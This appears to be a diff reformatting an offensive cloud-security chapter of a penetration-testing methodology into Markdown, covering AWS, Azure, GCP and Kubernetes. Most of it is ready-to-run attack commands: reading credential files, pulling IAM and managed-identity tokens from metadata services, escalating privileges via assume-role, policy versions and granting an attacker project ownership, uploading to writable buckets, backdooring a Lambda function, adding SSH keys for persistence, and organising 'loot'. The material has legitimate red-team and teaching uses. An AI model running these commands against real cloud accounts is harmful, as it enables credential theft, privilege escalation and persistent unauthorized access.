@@ -1,224 +1,471 @@
-11 - Cloud Security
-Philosophy
-Cloud environments introduce new paradigms: ephemeral resources, APIs instead of servers, and identity as the new perimeter. This phase focuses on attacking cloud infrastructure—AWS, Azure, GCP—by exploiting misconfigurations, leaked credentials, and overprivileged roles. The goal is to move from a low-privileged user to full cloud compromise.
+# 11 – Cloud Security
 
-Attack Surface Overview
-Cloud credentials: Access keys, service principals, tokens
+## Philosophy
 
-IAM roles/permissions: Overly permissive policies
+Cloud environments change the traditional attack model.
 
-Storage buckets: Publicly readable/writable S3, Azure Blob
+Instead of attacking servers directly, the focus shifts to:
 
-Compute instances: EC2, VMs with metadata service
+* **Identity and access management (IAM)**
+* **Cloud APIs**
+* **Misconfigured storage**
+* **Overprivileged roles**
 
-Serverless functions: Lambda, Azure Functions
+In cloud infrastructure, **identity becomes the new perimeter**.
 
-Kubernetes: Misconfigured clusters, RBAC
+A single leaked credential can allow attackers to:
 
-APIs: Management endpoints, metadata service
+* Enumerate cloud resources
+* Escalate privileges
+* Access storage
+* Deploy malicious compute
+* Achieve full cloud compromise
 
-Third-party integrations: OAuth, SaaS apps
+---
 
-Cloud Security Workflow
-text
-┌─────────────────────────────────────────────────────────┐
-│              Credential Discovery                         │
-│  (Env vars, config files, metadata service)              │
-└──────────────────────────────────────────────────────────┘
-                              │
-                              ▼
-┌─────────────────────────────────────────────────────────┐
-│              Cloud Provider Enumeration                   │
-│  (Identity, permissions, resources)                       │
-└──────────────────────────────────────────────────────────┘
-                              │
-                              ▼
-┌─────────────────────────────────────────────────────────┐
-│              Privilege Escalation                         │
-│  (IAM misconfigurations, role assumptions)                │
-└──────────────────────────────────────────────────────────┘
-                              │
-                              ▼
-┌─────────────────────────────────────────────────────────┐
-│              Resource Exploitation                        │
-│  (Storage bucket access, instance takeover)              │
-└──────────────────────────────────────────────────────────┘
-                              │
-                              ▼
-┌─────────────────────────────────────────────────────────┐
-│              Persistence                                  │
-│  (Backdoor users, API keys, Lambda backdoors)            │
-└──────────────────────────────────────────────────────────┘
-Command Arsenal
-AWS Enumeration
-bash
-# Check current identity
+# Cloud Attack Surface
+
+| Area             | Target                             |
+| ---------------- | ---------------------------------- |
+| Credentials      | API keys, tokens, service accounts |
+| IAM Policies     | Overprivileged roles               |
+| Storage          | Public buckets, exposed blobs      |
+| Compute          | EC2, Azure VMs, GCP instances      |
+| Serverless       | Lambda, Azure Functions            |
+| Containers       | Kubernetes clusters                |
+| APIs             | Cloud management endpoints         |
+| Metadata Service | Instance credential retrieval      |
+
+---
+
+# Cloud Attack Workflow
+
+```text
+Credential Discovery
+        │
+        ▼
+Cloud Enumeration
+        │
+        ▼
+Privilege Escalation
+        │
+        ▼
+Resource Exploitation
+        │
+        ▼
+Persistence
+```
+
+---
+
+# Credential Discovery
+
+Credentials are commonly stored in:
+
+* environment variables
+* config files
+* container images
+* metadata services
+
+### Environment Variables
+
+```bash
+env | grep -i aws
+env | grep -i azure
+env | grep -i google
+```
+
+---
+
+### Credential Files
+
+AWS:
+
+```bash
+cat ~/.aws/credentials
+cat ~/.aws/config
+```
+
+Azure:
+
+```bash
+cat ~/.azure/azureProfile.json
+cat ~/.azure/accessTokens.json
+```
+
+GCP:
+
+```bash
+cat ~/.config/gcloud/credentials.db
+cat ~/.config/gcloud/access_tokens.db
+```
+
+---
+
+### Docker Containers
+
+```bash
+cat /root/.aws/credentials
+```
+
+---
+
+### Cloud Metadata Service
+
+Common target when inside cloud VM.
+
+AWS:
+
+```bash
+curl http://169.254.169.254/latest/meta-data/
+```
+
+IAM Role Credentials:
+
+```bash
+curl http://169.254.169.254/latest/meta-data/iam/security-credentials/
+```
+
+---
+
+# AWS Enumeration
+
+### Identify Current Identity
+
+```bash
 aws sts get-caller-identity
 aws iam get-user
+```
 
-# List resources
+---
+
+### List Resources
+
+```bash
 aws s3 ls
 aws ec2 describe-instances --region us-east-1
 aws lambda list-functions --region us-east-1
 aws iam list-users
 aws iam list-roles
 aws iam list-policies
+```
 
-# Check bucket permissions
+---
+
+### Inspect Bucket Permissions
+
+```bash
 aws s3api get-bucket-acl --bucket target-bucket
 aws s3api get-bucket-policy --bucket target-bucket
+```
 
-# Download bucket contents
+---
+
+### Download Bucket Contents
+
+```bash
 aws s3 sync s3://target-bucket ./downloaded/
+```
 
-# Enumerate EC2 metadata (from inside instance)
-curl http://169.254.169.254/latest/meta-data/
-curl http://169.254.169.254/latest/meta-data/iam/security-credentials/
-Azure Enumeration
-bash
-# Login
+---
+
+# Azure Enumeration
+
+### Authentication
+
+```bash
 az login
 az account show
 az account list
+```
 
-# List resources
+---
+
+### Resource Discovery
+
+```bash
 az vm list --output table
 az storage account list
-az role assignment list --assignee user@domain.com
 az keyvault list
+```
 
-# Check storage
+---
+
+### IAM Permissions
+
+```bash
+az role assignment list --assignee user@domain.com
+```
+
+---
+
+### Storage Access
+
+```bash
 az storage container list --account-name targetaccount
 az storage blob list --container-name secrets --account-name targetaccount
-az storage blob download --container-name secrets --name secret.txt --file secret.txt
+```
 
-# Azure AD enumeration
+Download file:
+
+```bash
+az storage blob download \
+  --container-name secrets \
+  --name secret.txt \
+  --file secret.txt
+```
+
+---
+
+### Azure AD Enumeration
+
+```bash
 az ad user list
 az ad group list
 az ad sp list
-GCP Enumeration
-bash
-# Auth
+```
+
+---
+
+# GCP Enumeration
+
+### Authentication
+
+```bash
 gcloud auth login
 gcloud config list
+```
+
+---
+
+### Projects
+
+```bash
 gcloud projects list
+```
 
-# List resources
+---
+
+### Compute Resources
+
+```bash
 gcloud compute instances list
+```
+
+---
+
+### Storage
+
+```bash
 gcloud storage ls
-gcloud iam service-accounts list
-gcloud iam roles list
+```
 
-# GCS buckets
+or
+
+```bash
 gsutil ls
-gsutil ls gs://target-bucket
+```
+
+Download files:
+
+```bash
 gsutil cp gs://target-bucket/secret.txt .
-Cloud Credential Discovery
-bash
-# Environment variables
-env | grep -i aws
-env | grep -i azure
-env | grep -i google
+```
 
-# Config files
-cat ~/.aws/credentials
-cat ~/.aws/config
-cat ~/.azure/azureProfile.json
-cat ~/.azure/accessTokens.json
-cat ~/.config/gcloud/credentials.db
-cat ~/.config/gcloud/access_tokens.db
+---
 
-# From EC2 metadata (if on instance)
-curl http://169.254.169.254/latest/meta-data/iam/security-credentials/ROLE-NAME
+# Cloud Privilege Escalation
 
-# From Docker containers
-cat /root/.aws/credentials
-Privilege Escalation Techniques
-AWS
+## AWS
 
-bash
-# Assume role
-aws sts assume-role --role-arn arn:aws:iam::123456789012:role/AdminRole --role-session-name attacker
-# Use credentials from output
+### Assume IAM Role
 
-# If user has iam:CreatePolicyVersion, create admin policy
-aws iam create-policy-version --policy-arn arn:aws:iam::123456789012:policy/MyPolicy --policy-document file://admin.json --set-as-default
+```bash
+aws sts assume-role \
+--role-arn arn:aws:iam::123456789012:role/AdminRole \
+--role-session-name attacker
+```
 
-# If user can pass role to EC2, start instance with admin role
-aws ec2 run-instances --image-id ami-0abcdef1234567890 --instance-type t2.micro --iam-instance-profile Name=AdminRole
-# Then access metadata from that instance
-Azure
+Use credentials returned from the response.
 
-bash
-# If Contributor on VM, run command with managed identity
-az vm run-command invoke --resource-group RG --name VMName --command-id RunPowerShellScript --scripts "curl http://169.254.169.254/metadata/identity/oauth2/token?api-version=2018-02-01&resource=https://management.azure.com -H Metadata:true"
-GCP
+---
 
-bash
-# If you can update IAM policy
-gcloud projects add-iam-policy-binding project-id --member=user:attacker@example.com --role=roles/owner
-Storage Exploitation
-bash
-# AWS S3 public buckets
+### Create Admin Policy Version
+
+If `iam:CreatePolicyVersion` is allowed:
+
+```bash
+aws iam create-policy-version \
+--policy-arn arn:aws:iam::123456789012:policy/MyPolicy \
+--policy-document file://admin.json \
+--set-as-default
+```
+
+---
+
+### Launch EC2 with Privileged Role
+
+```bash
+aws ec2 run-instances \
+--image-id ami-0abcdef1234567890 \
+--instance-type t2.micro \
+--iam-instance-profile Name=AdminRole
+```
+
+Then extract credentials via metadata service.
+
+---
+
+## Azure
+
+If attacker has **Contributor access**:
+
+```bash
+az vm run-command invoke \
+--resource-group RG \
+--name VMName \
+--command-id RunPowerShellScript \
+--scripts "curl http://169.254.169.254/metadata/identity/oauth2/token?api-version=2018-02-01&resource=https://management.azure.com -H Metadata:true"
+```
+
+---
+
+## GCP
+
+Add attacker as project owner:
+
+```bash
+gcloud projects add-iam-policy-binding project-id \
+--member=user:attacker@example.com \
+--role=roles/owner
+```
+
+---
+
+# Storage Exploitation
+
+### Public AWS S3 Bucket
+
+List contents anonymously:
+
+```bash
 aws s3 ls s3://company-backups --no-sign-request
-# Upload malicious file if writeable
+```
+
+Upload file if writeable:
+
+```bash
 echo "malicious" > test.txt
 aws s3 cp test.txt s3://company-backups/ --no-sign-request
+```
 
-# Azure Blob public containers
-az storage blob list --container-name public --account-name targetaccount --auth-mode anonymous
-Serverless Backdoors
-bash
-# AWS Lambda backdoor
-aws lambda update-function-code --function-name my-function --zip-file fileb://backdoor.zip
-# backdoor.zip contains function that calls out to attacker
-Deep Cloud Attacks
-Metadata Service Attacks
-AWS
+---
 
-bash
-# From compromised EC2
+### Azure Public Blob Container
+
+```bash
+az storage blob list \
+--container-name public \
+--account-name targetaccount \
+--auth-mode anonymous
+```
+
+---
+
+# Metadata Service Attacks
+
+## AWS
+
+```bash
 curl http://169.254.169.254/latest/meta-data/iam/security-credentials/ROLE-NAME
-# Use those credentials
+```
+
+Export credentials:
+
+```bash
 export AWS_ACCESS_KEY_ID=...
 export AWS_SECRET_ACCESS_KEY=...
 export AWS_SESSION_TOKEN=...
-Azure
+```
 
-bash
-# Managed identity token
-curl 'http://169.254.169.254/metadata/identity/oauth2/token?api-version=2018-02-01&resource=https://management.azure.com' -H Metadata:true
-# Use token to access Azure management API
-GCP
+---
 
-bash
-curl -H "Metadata-Flavor: Google" http://169.254.169.254/computeMetadata/v1/instance/service-accounts/default/token
-Kubernetes Enumeration
-bash
-# If inside a pod
+## Azure
+
+```bash
+curl \
+'http://169.254.169.254/metadata/identity/oauth2/token?api-version=2018-02-01&resource=https://management.azure.com' \
+-H Metadata:true
+```
+
+---
+
+## GCP
+
+```bash
+curl -H "Metadata-Flavor: Google" \
+http://169.254.169.254/computeMetadata/v1/instance/service-accounts/default/token
+```
+
+---
+
+# Kubernetes Enumeration
+
+If inside a pod:
+
+```bash
 kubectl get pods
 kubectl get secrets
 kubectl get configmaps
-# Check permissions
+```
+
+Check permissions:
+
+```bash
 kubectl auth can-i create pod
 kubectl auth can-i list secrets --all-namespaces
+```
 
-# Mounted service account token
+Service account token:
+
+```bash
 cat /var/run/secrets/kubernetes.io/serviceaccount/token
-# Use that token to authenticate to API server
-Cloud Shell Persistence
-bash
-# Add SSH keys to project metadata
-gcloud compute project-info add-metadata --metadata ssh-keys="attacker:ssh-rsa AAA..."
-Automation Techniques
-Cloud Enumeration Script
-bash
+```
+
+---
+
+# Serverless Backdoors
+
+Example AWS Lambda modification:
+
+```bash
+aws lambda update-function-code \
+--function-name my-function \
+--zip-file fileb://backdoor.zip
+```
+
+---
+
+# Persistence
+
+### Add SSH Keys to GCP Project
+
+```bash
+gcloud compute project-info add-metadata \
+--metadata ssh-keys="attacker:ssh-rsa AAA..."
+```
+
+---
+
+# Automation
+
+## Cloud Enumeration Script
+
+```bash
 #!/bin/bash
-# cloud_enum.sh - Automate cloud provider checks
 
 # AWS
 if command -v aws &> /dev/null; then
-    echo "[*] AWS credentials found"
     aws sts get-caller-identity > aws_identity.txt
     aws iam list-users > aws_users.txt
     aws s3 ls > aws_buckets.txt
@@ -226,82 +473,108 @@ fi
 
 # Azure
 if command -v az &> /dev/null; then
-    echo "[*] Azure credentials found"
     az account show > azure_account.txt
     az vm list --output table > azure_vms.txt
-    az storage account list > azure_storage.txt
 fi
 
 # GCP
 if command -v gcloud &> /dev/null; then
-    echo "[*] GCP credentials found"
     gcloud projects list > gcp_projects.txt
     gcloud compute instances list > gcp_instances.txt
 fi
-Cloud Scanner with ScoutSuite
-bash
-# ScoutSuite (multi-cloud auditing)
+```
+
+---
+
+# Cloud Security Scanning Tools
+
+### ScoutSuite
+
+Multi-cloud security auditing tool.
+
+```bash
 pip install scoutsuite
-scout aws --access-keys --access-key-id AKIA... --secret-access-key ...
+```
+
+Run scans:
+
+```bash
+scout aws --access-keys
 scout azure --cli
 scout gcp --user-account
-Attack Path Identification
-Common Cloud Attack Chains
-Leaked AWS keys → S3 bucket read → Credentials in bucket → IAM privilege escalation
+```
 
-Compromised EC2 instance → Metadata service → Role credentials → Other resources
+---
 
-Public S3 bucket → Sensitive data → Access keys → Full compromise
+# Common Cloud Attack Chains
 
-Kubernetes pod with service account → API access → Create privileged pod → Host compromise
+| Initial Access   | Result                                  |
+| ---------------- | --------------------------------------- |
+| Leaked AWS keys  | S3 bucket access → credentials → admin  |
+| EC2 compromise   | Metadata service → IAM role credentials |
+| Public S3 bucket | Sensitive data exposure                 |
+| Kubernetes pod   | Service account → cluster admin         |
 
-Common Mistakes
-Mistake 1: Ignoring cloud metadata service
-It's a goldmine.
+---
 
-Mistake 2: Assuming default credentials are safe
-Many cloud resources are publicly exposed.
+# Common Mistakes
 
-Mistake 3: Not checking IAM permissions thoroughly
-Overprivileged roles are everywhere.
+### Ignoring metadata service
 
-Mistake 4: Using outdated tools
-Cloud APIs change; use updated tools.
+Many attackers forget this — **it's often the easiest credential source**.
 
-Professional Tips
-Tip 1: Use nimbostratus for AWS privilege escalation
-It automates many attack paths.
+---
 
-Tip 2: Always check for public buckets
-Use tools like bucket-stream or slurp.
+### Not auditing IAM policies
 
-Tip 3: In Azure, check for Azure Automation accounts
-They often have runbooks with credentials.
+Overprivileged roles are extremely common.
 
-Tip 4: In GCP, check for Cloud Functions
-They may have environment variables with secrets.
+---
 
-Output Organization
-text
-11-Cloud-Security/
+### Assuming cloud resources are private
+
+Misconfigured storage frequently exposes sensitive data.
+
+---
+
+### Using outdated tools
+
+Cloud APIs change frequently.
+
+---
+
+# Professional Tips
+
+• Use **Nimbostratus** for AWS privilege escalation analysis
+• Always check for **public storage buckets**
+• Investigate **Azure Automation runbooks** for credentials
+• Check **GCP Cloud Functions environment variables**
+
+---
+
+# Suggested Repository Structure
+
+```text
+11-Cloud-Security
 ├── README.md
-├── providers/
-│   ├── aws/
+├── providers
+│   ├── aws
 │   │   ├── credentials.txt
 │   │   ├── iam_policies.txt
 │   │   ├── s3_buckets.txt
 │   │   └── ec2_instances.txt
-│   ├── azure/
+│   ├── azure
 │   │   ├── subscriptions.txt
 │   │   ├── role_assignments.txt
 │   │   ├── storage_accounts.txt
 │   │   └── vms.txt
-│   └── gcp/
+│   └── gcp
 │       ├── projects.txt
 │       ├── service_accounts.txt
 │       ├── buckets.txt
 │       └── instances.txt
-├── loot/
-│   ├── bucket_contents/
+├── loot
+│   ├── bucket_contents
 │   └── credentials_dump.txt
 └── attack_paths.txt
+```
